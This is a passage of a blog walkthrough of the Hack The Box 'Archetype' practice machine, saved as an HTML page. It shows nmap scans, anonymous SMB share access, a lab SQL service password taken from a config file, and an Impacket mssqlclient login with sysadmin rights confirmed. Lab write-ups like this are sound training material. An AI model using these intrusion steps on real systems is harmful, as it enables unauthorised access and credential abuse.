@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Archetype Walkthrough</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preload" href="../assets/css/app.css%3Fv=5e4dc0b160.css" as="style" />
+    <link rel="preload" href="../assets/js/manifest.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/vendor/content-api.min.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/vendor.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preload" href="../assets/js/app.js%3Fv=5e4dc0b160" as="script" />
+    <link rel="preconnect" href="https://polyfill.io">
+    <link rel="dns-prefetch" href="https://polyfill.io">
+
+      <link rel="preload" href="../assets/css/post.css%3Fv=5e4dc0b160.css" as="style" />
+  <link rel="preload" href="../assets/js/post.js%3Fv=5e4dc0b160" as="script" />
+
+
+    <style>
+      /* These font-faces are here to make fonts work if the Ghost instance is installed in a subdirectory */
+
+      /* source-sans-pro-regular */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: local('SourceSansPro-Regular'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* source-sans-pro-600 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 600;
+        font-display: swap;
+        src: local('SourceSansPro-SemiBold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* source-sans-pro-700 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: local('SourceSansPro-Bold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff2%3Fv=5e4dc0b160") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff%3Fv=5e4dc0b160") format('woff');
+      }
+
+      /* iconmoon */
+      @font-face {
+        font-family: 'icomoon';
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3%3Fv=5e4dc0b160");
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3") format('embedded-opentype'),
+        url("../assets/fonts/icomoon/icomoon.ttf%3F101fc3%3Fv=5e4dc0b160") format('truetype'),
+        url("../assets/fonts/icomoon/icomoon.woff%3F101fc3%3Fv=5e4dc0b160") format('woff'),
+        url("../assets/fonts/icomoon/icomoon.svg%3F101fc3") format('svg');
+      }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/css/app.css%3Fv=5e4dc0b160.css" media="screen" />
+
+      <link rel="stylesheet" type="text/css" href="../assets/css/post.css%3Fv=5e4dc0b160.css" media="screen" />
+
+
+    
+
+    <meta name="description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it’s a series of 9 machines rated easy that should be rooted in a sequence." />
+    <link rel="icon" href="../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="h4rithd.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Archetype Walkthrough" />
+    <meta property="og:description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it’s a series of 9 machines rated easy that should be rooted in a sequence." />
+    <meta property="og:url" content="http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/" />
+    <meta property="og:image" content="http://192.168.8.3:2368/content/images/2021/05/banner-3.jpg" />
+    <meta property="article:published_time" content="2021-05-14T18:47:00.000Z" />
+    <meta property="article:modified_time" content="2021-05-26T19:34:28.000Z" />
+    <meta property="article:tag" content="StartingPoint" />
+    <meta property="article:tag" content="HackTheBox" />
+    <meta property="article:tag" content="Archetype Walkthrough" />
+    <meta property="article:tag" content="h4rithd" />
+    <meta property="article:tag" content="HarithDilshan" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Archetype Walkthrough" />
+    <meta name="twitter:description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it’s a series of 9 machines rated easy that should be rooted in a sequence." />
+    <meta name="twitter:url" content="http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/" />
+    <meta name="twitter:image" content="http://192.168.8.3:2368/content/images/2021/05/banner-3.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Harith Dilshan" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="StartingPoint, HackTheBox, Archetype Walkthrough, h4rithd, HarithDilshan" />
+    <meta name="twitter:site" content="@h4rithd" />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1182" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "h4rithd.com",
+        "url": "http://192.168.8.3:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/my.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Harith Dilshan",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg",
+            "width": 2000,
+            "height": 2000
+        },
+        "url": "http://192.168.8.3:2368/author/harith/",
+        "sameAs": []
+    },
+    "headline": "Archetype Walkthrough",
+    "url": "http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/",
+    "datePublished": "2021-05-14T18:47:00.000Z",
+    "dateModified": "2021-05-26T19:34:28.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://192.168.8.3:2368/content/images/2021/05/banner-3.jpg",
+        "width": 1920,
+        "height": 1182
+    },
+    "keywords": "StartingPoint, HackTheBox, Archetype Walkthrough, h4rithd, HarithDilshan",
+    "description": "Here I will begin with the path of &quot;Starting Point&quot;. Basically it’s a series of\n9 machines rated easy that should be rooted in a sequence.\n\n\n--------------------------------------------------------------------------------\n\nThey will provide official walkthroughs for each 9 machines. As I think it will\nbe very helpful for noob to understand the platform, techniques and more about\nHTB. And when it comes to noob, no one is here to find just zero-day\nvulnerabilities. So from my perspective, it&#x27;s fin",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://192.168.8.3:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.6" />
+    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../rss/index.html" />
+    <script defer src="https://unpkg.com/@tryghost/portal@~1.4.0/umd/portal.min.js" data-ghost="http://192.168.8.3:2368/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style><style>:root {--ghost-accent-color: #006ac7;}</style>
+
+    <script>
+      // @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&dn=expat.txt Expat
+      const ghostHost = "http://192.168.8.3:2368"
+      // @license-end
+    </script>
+  </head>
+  <body class="post-template tag-startingpoint tag-hackthebox tag-archetype-walkthrough tag-h4rithd tag-harithdilshan">
+    
+
+
+
+  
+<header class="m-header with-picture js-header">
+  <div class="m-mobile-topbar" data-aos="fade-down">
+    <button class="m-icon-button in-mobile-topbar js-open-menu" aria-label="Open menu">
+      <span class="icon-menu" aria-hidden="true"></span>
+    </button>
+      <a href="../index.html" class="m-logo in-mobile-topbar">
+        <img src="../content/images/2021/05/my.png" alt="h4rithd.com">
+      </a>
+    <button class="m-icon-button in-mobile-topbar js-open-search" aria-label="Open search">
+      <span class="icon-search" aria-hidden="true"></span>
+    </button>
+  </div>
+
+  <div class="m-menu js-menu">
+    <button class="m-icon-button outlined as-close-menu js-close-menu" aria-label="Close menu">
+      <span class="icon-close"></span>
+    </button>
+    <div class="m-menu__main" data-aos="fade-down">
+      <div class="l-wrapper">
+        <div class="m-nav js-main-nav">
+          <nav class="m-nav__left js-main-nav-left" role="navigation" aria-label="Main menu">
+            <ul>
+                <li class="only-desktop">
+                  <a href="../index.html" class="m-logo">
+                    <img src="../content/images/2021/05/my.png" alt="h4rithd.com">
+                  </a>
+                </li>
+                
+    <li class="nav-me">
+      <a href="https://h4rithd.com/">Me</a>
+    </li>
+    <li class="nav-blog">
+      <a href="https://h4rithd.com/blog/">Blog</a>
+    </li>
+
+              <li class="submenu-option js-submenu-option">
+                <button class="m-icon-button in-menu-main more js-toggle-submenu" aria-label="Open submenu">
+                  <span class="icon-more" aria-hidden="true"></span>
+                </button>
+                <div class="m-submenu js-submenu">
+                  <div class="l-wrapper in-submenu">
+                    <section class="m-recent-articles">
+                      <h3 class="m-submenu-title in-recent-articles">Recent articles</h3>
+                          <div class="glide js-recent-slider">
+                            <div class="glide__track" data-glide-el="track">
+                              <div class="glide__slides">
+                                <div class="glide__slide">
+                                  <a href="index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/05/banner-3.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Archetype Walkthrough">
+                                      Archetype Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">12 days ago</span>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                    </section>
+                    <section class="m-tags">
+                      <h3 class="m-submenu-title">Tags</h3>
+                        <ul>
+                            <li>
+                              <a href="../tag/archetype-walkthrough/index.html">Archetype Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/hackthebox/index.html">HackTheBox</a>
+                            </li>
+                            <li>
+                              <a href="../tag/harithdilshan/index.html">HarithDilshan</a>
+                            </li>
+                            <li>
+                              <a href="../tag/startingpoint/index.html">StartingPoint</a>
+                            </li>
+                            <li>
+                              <a href="../tag/h4rithd/index.html">h4rithd</a>
+                            </li>
+                        </ul>
+                    </section>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </nav>
+          <div class="m-nav__right">
+            <button class="m-icon-button in-menu-main js-open-search" aria-label="Open search">
+              <span class="icon-search" aria-hidden="true"></span>
+            </button>
+            <div class="m-toggle-darkmode js-tooltip" data-tippy-content="Toggle dark mode" tabindex="0">
+              <label for="toggle-darkmode" class="sr-only">
+                Toggle dark mode
+              </label>
+              <input id="toggle-darkmode" type="checkbox" class="js-toggle-darkmode">
+              <div>
+                <span class="icon-moon moon" aria-hidden="true"></span>
+                <span class="icon-sunny sun" aria-hidden="true"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+
+<main class="main-wrap">
+    
+  <section class="m-hero with-picture" data-aos="fade">
+    <div class="m-hero__picture in-post">
+      <img
+        srcset="../content/images/size/w300/2021/05/banner-3.jpganner-3.jpg 300w../content/images/size/w600/2021/05/banner-3.jpgbanner-3.jpg 600../content/images/size/w1000/2021/05/banner-3.jpg/banner-3.jpg 100../content/images/size/w2000/2021/05/banner-3.jpg5/banner-3.jpg 2000w
+        "
+        sizes="(max-width: 600px) 600px, (max-width: 1000px) 1000px, 2000px"
+        src="../content/images/size/w1000/2021/05/banner-3.jpg"
+        alt=""
+      />
+    </div>
+    </section>
+  
+  <article>
+    <div class="l-content in-post">
+        <div class="l-wrapper in-post  js-aos-wrapper" data-aos="fade-up"
+          data-aos-delay="300">
+          <div
+            class="l-post-content js-progress-content">
+            <header class="m-heading">
+              <h1 class="m-heading__title in-post">Archetype Walkthrough</h1>
+              <div class="m-heading__meta">
+                  <a href="../tag/startingpoint/index.html" class="m-heading__meta__tag">StartingPoint</a>
+                  <span class="m-heading__meta__divider" aria-hidden="true">&bull;</span>
+                <span class="m-heading__meta__time">May 15, 2021</span>
+              </div>
+            </header>
+            <div class="pos-relative js-post-content">
+              <div class="m-share">
+                <div class="m-share__content js-sticky">
+                  <a href="https://www.facebook.com/sharer/sharer.php?u=http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Facebook">
+                    <span class="icon-facebook" aria-hidden="true"></span>
+                  </a>
+                  <a href="https://twitter.com/intent/tweet?text=Archetype%20Walkthrough&url=http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Twitter">
+                    <span class="icon-twitter" aria-hidden="true"></span>
+                  </a>
+                  <button class="m-icon-button filled in-share progress js-scrolltop" aria-label="Scroll to top">
+                    <span class="icon-arrow-top" aria-hidden="true"></span>
+                    <svg aria-hidden="true">
+                      <circle class="progress-ring__circle js-progress" fill="transparent" r="0" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <p>Here I will begin with the path of "Starting Point". Basically it’s a series of 9 machines rated easy that should be rooted in a sequence.</p><hr><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-2.png" class="kg-image" alt loading="lazy" width="999" height="759" srcset="../content/images/size/w600/2021/05/image-2.png 600w, ../content/images/2021/05/image-2.png 999w" sizes="(min-width: 720px) 720px"></figure><p>They will provide official walkthroughs for each 9 machines. As I think it will be very helpful for noob to understand the platform, techniques and more about HTB. And when it comes to noob, no one is here to find just zero-day vulnerabilities. So from my perspective, it's fine to read each and every walkthroughs provided by HTB and others to understand by yourself. <em>"Walkthroughs are the teachers".</em></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-3.png" class="kg-image" alt loading="lazy" width="1202" height="328" srcset="../content/images/size/w600/2021/05/image-3.png 600w, ../content/images/size/w1000/2021/05/image-3.png 1000w, ../content/images/2021/05/image-3.png 1202w" sizes="(min-width: 720px) 720px"></figure><p>Enough talks 🥱, let's start to hack. 🐱‍💻</p><blockquote>Disclaimers: No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! 🐱‍👤</blockquote><hr><h1 id="00-start-machine-%E2%80%A6">00. Start Machine …</h1><p>To start machine, Just click "Join Machine".</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-4.png" class="kg-image" alt loading="lazy" width="1633" height="751" srcset="../content/images/size/w600/2021/05/image-4.png 600w, ../content/images/size/w1000/2021/05/image-4.png 1000w, ../content/images/size/w1600/2021/05/image-4.png 1600w, ../content/images/2021/05/image-4.png 1633w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. usually it is<strong> 10.10.10.27 🤠</strong></p><p>Before going to enumeration steps we can simply ping to the IP address and check our VPN connection and whether machine is alive. Sometimes machines might "Disable" ping requests from passing through the firewall. But in most case ping will be a success!</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype
+⚡❯ ping 10.10.10.27 -c 2
+PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
+64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=252 ms
+64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=251 ms
+
+--- 10.10.10.27 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 250.934/251.550/252.167/0.616 ms
+--------------------------------------------------------------------</code></pre><hr><h1 id="01-enumeration-first-%E2%80%A6">01. Enumeration First …</h1><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27</code></pre><pre><code class="language-bash">-n	: Never do DNS resolution
+-vv	: Extra verbosity
+--open	: Output only open ports
+-p-	: Full TCP ports range (65535)
+-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable netwok</code></pre><p>Here is the output 👇</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2 
+⚡❯ nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:15 +0530
+Initiating Ping Scan at 19:15
+Scanning 10.10.10.27 [4 ports]
+Completed Ping Scan at 19:15, 0.27s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 19:15
+Scanning 10.10.10.27 [65535 ports]
+Completed SYN Stealth Scan at 19:17, 172.44s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.27
+Host is up, received echo-reply ttl 127 (0.67s latency).
+Scanned at 2021-04-15 19:15:06 +0530 for 173s
+Not shown: 65523 closed ports
+Reason: 65523 resets
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+1433/tcp  open  ms-sql-s     syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
+           Raw packets sent: 102404 (4.506MB) | Rcvd: 93270 (3.731MB)
+--------------------------------------------------------------------</code></pre><p>I have some tricky bash script to get all open ports as bash variable call "ports". Somehow it will be helpful later. 😎</p><pre><code class="language-bash">ports=$(cat AllPorts.nmap | grep ^\[0-9\] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)
+</code></pre><p>Yes, we can simply combine those two lines into one. But I need to see results quickly. That's why I divide it into two parts. If you want it in one line, you can use 👇👇</p><pre><code class="language-bash">ports=$(nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)" 
+</code></pre><p>Here is the output 👇</p><pre><code class="language-sql">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2  took 2m52s
+⚡❯ more AllPorts.nmap
+# Nmap 7.91 scan initiated Thu Apr 15 19:15:06 2021 as: nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
+Nmap scan report for 10.10.10.27
+Host is up, received echo-reply ttl 127 (0.67s latency).
+Scanned at 2021-04-15 19:15:06 +0530 for 173s
+Not shown: 65523 closed ports
+Reason: 65523 resets
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127 * (Interesting)
+139/tcp   open  netbios-ssn  syn-ack ttl 127 * (Interesting)
+445/tcp   open  microsoft-ds syn-ack ttl 127 * (Interesting)
+1433/tcp  open  ms-sql-s     syn-ack ttl 127 * (Interesting)
+5985/tcp  open  wsman        syn-ack ttl 127 * (Interesting)
+47001/tcp open  winrm        syn-ack ttl 127 * (Interesting)
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127</code></pre><p>Here we can see some  <strong>* (Interesting)</strong> ports. others can be avoid.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all open ports so that we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p$ports 10.10.10.27 </code></pre><pre><code class="language-bash">-sV	: Service fingerprinting
+-sC	: Launch default NSE nmap scripts</code></pre><p>Most of the case this will be end up an error because of $ports variable. This is not the right time to fix it so if you get any error, run the command without $ports variable and point out all ports.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27 </code></pre><p>Here is the output 👇</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:38 +0530
+Nmap scan report for 10.10.10.27
+Host is up (0.52s latency).
+
+PORT     STATE  SERVICE        VERSION
+135/tcp  open   msrpc          Microsoft Windows RPC
+139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
+455/tcp  closed creativepartnr
+1433/tcp open   ms-sql-s       Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-04-15T14:30:06
+|_Not valid after:  2051-04-15T14:30:06
+|_ssl-date: 2021-04-15T14:30:34+00:00; +21m39s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 21m39s, deviation: 0s, median: 21m38s
+| ms-sql-info:
+|   10.10.10.27:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds</code></pre><p>Now we know the OS is Windows (Microsoft SQL Server 2017 RTM) and it has SMB (1433) port open. And lets enumerate further. Remember enumerating is the key! 🔑</p><h3 id="013-list-all-available-shares">01.3 List all available shares</h3><p>So here it has smb (1433) port open. I used smbclient to list out all the available shares as anonymous user.</p><pre><code class="language-bash">sudo smbclient -N -L 10.10.10.27</code></pre><pre><code class="language-bash">-N	: Don't ask for a password
+-L	: Get a list of shares available on a host</code></pre><p>Here is output 👇</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ sudo smbclient -N -L 10.10.10.27
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available</code></pre><p>Here we got something very interesting right? There is only single share ‘<strong>backups</strong>’ accessible with no passwords. so let's try to access it and see what's inside.😎😋</p><pre><code class="language-bash">smbclient -N \\\\10.10.10.27\\backups\\</code></pre><p>So now we are done with SMB shell and there is a file called ‘prod.dtsConfig'. so let's download it.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ smbclient -N \\\\10.10.10.27\\backups\\
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Jan 20 17:50:57 2020
+  ..                                  D        0  Mon Jan 20 17:50:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020
+
+                10328063 blocks of size 4096. 8203982 blocks available
+smb: \&gt; get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \&gt;</code></pre><pre><code class="language-bash">smb: \&gt; dir	: List all directories
+smb: \&gt; get	&lt;file-name&gt; : Download file</code></pre><p>Now we can open prod.dtsConfig file and yeah that ‘prod.dtsConfig’ file contains a SQL connection string, containing credentials for the local Windows user <strong>ARCHETYPE\sql_svc</strong> 🥂.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2  took 5m55s
+⚡❯ more prod.dtsConfig
+&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
+        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;</code></pre><hr><h1 id="02-lets-get-foothold-%E2%80%A6">02. Lets get Foothold …</h1><p>Now we have credentials,  Let's try connecting to the SQL Server using <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py" rel="noopener noreferrer">Impacket's </a>mssqlclient.py</p><blockquote>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.source : <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a></blockquote><h3 id="021-download-and-use-mssqlclientpy">02.1 Download and use mssqlclient.py</h3><p>First we need to simply wget and download the mssqlclient.py script.</p><pre><code class="language-bash"> wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
+</code></pre><p>And then run the script and check whether we are working as a sysadmin (privileged user) or not.</p><pre><code class="language-bash">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth</code></pre><p>Now we can use the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><strong>IS_SRVROLEMEMBER </strong></a>function to check whether the current SQL user has sysadmin (highest level) privileges on the SQL Server.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype 🐍 v3.9.2
+⚡❯ python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL&gt; SELECT IS_SRVROLEMEMBER ('sysadmin')
+
+
+-----------
+
+          1
+
